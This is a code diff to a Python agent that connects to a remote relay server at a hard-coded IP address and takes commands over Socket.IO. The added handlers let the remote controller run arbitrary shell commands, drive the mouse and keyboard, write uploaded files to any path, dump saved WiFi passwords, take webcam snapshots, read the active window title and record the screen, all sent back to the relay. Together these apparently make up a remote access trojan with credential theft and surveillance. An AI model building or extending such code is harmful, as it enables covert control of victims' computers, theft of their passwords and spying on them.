@@ -11,7 +11,7 @@ import socket
 import threading
 import socketio
 
-RELAY_URL = os.environ.get("NORA_RELAY", "http://84.200.81.161:5000")
+RELAY_URL = os.environ.get("NORA_RELAY", "http://16.55.3.205:5000")
 AGENT_NAME   = os.environ.get("NORA_NAME",   "") or platform.node() or socket.gethostname() or "agent"
 AGENT_SECRET = os.environ.get("NORA_SECRET", "")
 
@@ -21,6 +21,7 @@ _recorder = None
 _camera = None
 _mic = None
 _lock = threading.Lock()
+_screen_recorder = None  # active screen-recording thread state
 
 
 def init(controller_fn, recorder, camera, mic=None):
@@ -399,6 +400,209 @@ def _make_client():
             })
         except Exception as e:
             sio.emit("monitors_result", {"monitors": [], "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── 1. Full desktop mouse control ─────────────────────────────────────────
+    @sio.on("desktop_mouse")
+    def _on_desktop_mouse(data):
+        try:
+            import pyautogui
+            action = (data or {}).get("action", "click")
+            x = data.get("x")
+            y = data.get("y")
+            if action == "move" and x is not None and y is not None:
+                pyautogui.moveTo(x, y, duration=0.05)
+            elif action in ("click", "left") and x is not None and y is not None:
+                pyautogui.click(x, y)
+            elif action == "right" and x is not None and y is not None:
+                pyautogui.rightClick(x, y)
+            elif action == "double" and x is not None and y is not None:
+                pyautogui.doubleClick(x, y)
+            elif action == "scroll":
+                pyautogui.scroll(data.get("amount", 3), x=x, y=y)
+            elif action == "drag":
+                x2, y2 = data.get("x2", x), data.get("y2", y)
+                pyautogui.dragTo(x2, y2, duration=data.get("duration", 0.3) / 1000)
+            elif action == "mousedown":
+                pyautogui.mouseDown(x, y, button=data.get("button", "left"))
+            elif action == "mouseup":
+                pyautogui.mouseUp(x, y, button=data.get("button", "left"))
+            sio.emit("desktop_mouse_result", {"ok": True, "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("desktop_mouse_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── 2. Desktop keyboard typing ────────────────────────────────────────────
+    @sio.on("desktop_type")
+    def _on_desktop_type(data):
+        try:
+            import pyautogui
+            text = (data or {}).get("text", "")
+            key  = (data or {}).get("key")
+            hotkey = (data or {}).get("hotkey")  # list like ["ctrl","c"]
+            if hotkey:
+                pyautogui.hotkey(*hotkey)
+            elif key:
+                pyautogui.press(key)
+            elif text:
+                pyautogui.typewrite(text, interval=0.02)
+            sio.emit("desktop_type_result", {"ok": True, "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("desktop_type_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── 3. Power controls ─────────────────────────────────────────────────────
+    @sio.on("power_action")
+    def _on_power_action(data):
+        try:
+            import wintools as wt
+            result = wt.power_action((data or {}).get("action", "lock"))
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("power_result", result)
+        except Exception as e:
+            sio.emit("power_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── 4. Run shell command ──────────────────────────────────────────────────
+    @sio.on("run_command")
+    def _on_run_command(data):
+        try:
+            import subprocess as _sp
+            cmd = (data or {}).get("cmd", "")
+            timeout = (data or {}).get("timeout", 30)
+            result = _sp.run(
+                cmd, shell=True, capture_output=True, text=True,
+                timeout=timeout, errors="replace",
+            )
+            sio.emit("command_result", {
+                "stdout": result.stdout,
+                "stderr": result.stderr,
+                "returncode": result.returncode,
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("command_result", {"error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── 5. Upload file to PC ──────────────────────────────────────────────────
+    @sio.on("upload_file")
+    def _on_upload_file(data):
+        try:
+            import base64 as _b64, os as _os
+            path  = (data or {}).get("path", "")
+            b64   = (data or {}).get("data", "")
+            raw   = _b64.b64decode(b64)
+            _os.makedirs(_os.path.dirname(_os.path.abspath(path)) or ".", exist_ok=True)
+            with open(path, "wb") as f:
+                f.write(raw)
+            sio.emit("upload_result", {"ok": True, "path": path, "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("upload_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── 6. WiFi saved passwords ───────────────────────────────────────────────
+    @sio.on("get_wifi_passwords")
+    def _on_get_wifi_passwords(data):
+        try:
+            import wintools as wt
+            passwords = wt.get_wifi_passwords()
+            sio.emit("wifi_passwords_result", {
+                "passwords": passwords, "count": len(passwords),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("wifi_passwords_result", {"error": str(e), "passwords": [], "count": 0, "_requester": data.get("_requester") if data else None})
+
+    # ── 7. Webcam snapshot ────────────────────────────────────────────────────
+    @sio.on("webcam_snapshot")
+    def _on_webcam_snapshot(data):
+        try:
+            import wintools as wt, base64 as _b64
+            jpeg = wt.webcam_snapshot()
+            sio.emit("webcam_snapshot_result", {
+                "data": _b64.b64encode(jpeg).decode(),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("webcam_snapshot_result", {"error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── 8a. Active window title ───────────────────────────────────────────────
+    @sio.on("get_active_window")
+    def _on_get_active_window(data):
+        try:
+            import wintools as wt
+            result = wt.get_active_window()
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("active_window_result", result)
+        except Exception as e:
+            sio.emit("active_window_result", {"title": "", "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── 8b. Screen recording ──────────────────────────────────────────────────
+    @sio.on("start_recording")
+    def _on_start_recording(data):
+        global _screen_recorder
+        try:
+            import mss as _mss, cv2 as _cv2, tempfile as _tmp, os as _os, time as _time
+            if _screen_recorder and _screen_recorder.get("running"):
+                sio.emit("recording_result", {"ok": False, "error": "already recording", "_requester": data.get("_requester") if data else None})
+                return
+            fps   = (data or {}).get("fps", 10)
+            limit = (data or {}).get("limit", 30)  # max seconds
+            tmp   = _tmp.NamedTemporaryFile(suffix=".mp4", delete=False)
+            tmp.close()
+            state = {"running": True, "path": tmp.name, "requester": data.get("_requester") if data else None}
+            _screen_recorder = state
+
+            def _record():
+                with _mss.mss() as sct:
+                    mon = sct.monitors[1]
+                    w, h = mon["width"] // 2, mon["height"] // 2
+                    fourcc = _cv2.VideoWriter_fourcc(*"mp4v")
+                    out = _cv2.VideoWriter(state["path"], fourcc, fps, (w, h))
+                    try:
+                        start = _time.time()
+                        while state["running"] and (_time.time() - start) < limit:
+                            shot = sct.grab(mon)
+                            from PIL import Image as _I
+                            img = _I.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
+                            img = img.resize((w, h))
+                            import numpy as _np
+                            frame = _np.array(img)
+                            out.write(_cv2.cvtColor(frame, _cv2.COLOR_RGB2BGR))
+                            _time.sleep(1 / fps)
+                    finally:
+                        out.release()
+                        state["running"] = False
+
+            t = threading.Thread(target=_record, daemon=True, name="screen-rec")
+            t.start()
+            state["thread"] = t
+            sio.emit("recording_started", {"ok": True, "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("recording_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("stop_recording")
+    def _on_stop_recording(data):
+        global _screen_recorder
+        try:
+            import base64 as _b64, os as _os
+            if not _screen_recorder:
+                sio.emit("recording_result", {"ok": False, "error": "not recording", "_requester": data.get("_requester") if data else None})
+                return
+            _screen_recorder["running"] = False
+            t = _screen_recorder.get("thread")
+            if t:
+                t.join(timeout=10)
+            path = _screen_recorder.get("path", "")
+            requester = _screen_recorder.get("requester") or (data.get("_requester") if data else None)
+            _screen_recorder = None
+            if path and _os.path.exists(path):
+                with open(path, "rb") as f:
+                    raw = f.read()
+                _os.unlink(path)
+                sio.emit("recording_result", {
+                    "ok": True,
+                    "data": _b64.b64encode(raw).decode(),
+                    "_requester": requester,
+                })
+            else:
+                sio.emit("recording_result", {"ok": False, "error": "output file missing", "_requester": requester})
+        except Exception as e:
+            sio.emit("recording_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
 
     return sio
 
